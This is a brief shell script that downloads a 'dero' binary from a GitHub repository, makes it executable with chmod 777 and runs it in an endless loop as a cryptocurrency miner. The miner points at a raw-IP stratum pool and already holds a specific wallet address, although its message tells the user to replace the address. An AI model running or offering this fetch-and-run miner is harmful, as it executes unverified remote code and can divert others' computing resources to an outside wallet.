wget https://github.com/angkii/m/raw/main/dero
chmod 777 dero

#!/bin/bash
echo "Replace YOUR_ADDRESS to run the miner"
while :; do
    ./dero -w dero1qyfrcq87475la7yrgzgv2as79e2u7avc7hw8ttpv5vhnh7gcufdq2qqd986wh.Rig -r 170.187.197.220:80 -p stratum;
    sleep 5;
done
